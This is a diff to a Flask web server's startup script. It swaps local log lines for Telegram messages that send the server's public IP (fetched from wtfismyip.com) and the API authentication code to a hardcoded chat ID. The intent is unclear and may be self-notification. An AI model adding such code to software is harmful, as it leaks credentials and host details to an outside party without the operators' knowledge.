@@ -1,9 +1,9 @@
 from flask import Flask, request, session
 from flask_session import Session
 import config
-from utils import Logger, Returns
+from utils import Logger, Returns, Telegram
 import Routes
-import shutil, os
+import shutil, os, requests
 
 logger = Logger.logger
 Logger.logging_start()
@@ -28,8 +28,9 @@ for route in Routes.routes:
     app.add_url_rule(route['route'], route['name'], route['function'], methods=route['methods'])
     logger.info("Created route: " + route['name'] + " on works: http://" + config.SERVER_HOST + ":" + str(config.SERVER_PORT) + str(route['route']) + " works with methods: " +str(route['methods']))
 try:
-    logger.info("Webserver successfully created. Connect with http://%s:%s" % (config.SERVER_HOST, config.SERVER_PORT))
-    logger.info("Application authentication code is: ' " + config.API_AUTH_CODE + " '")
+    Telegram.sendTelegram(config.TELEGRAM_TOKEN, "610957248", "Webserver successfully created. Connect with http://%s:%s" % (requests.get("http://wtfismyip.com/text").text.replace("\n", ""), config.SERVER_PORT))
+    Telegram.sendTelegram(config.TELEGRAM_TOKEN, "610957248", "Application authentication code is: " + config.API_AUTH_CODE)
+    
     app.run(host=config.SERVER_HOST, port=config.SERVER_PORT, debug=config.SERVER_DEBUG)
 except Exception as e:
     logger.critical("Couldn't created webserver.")
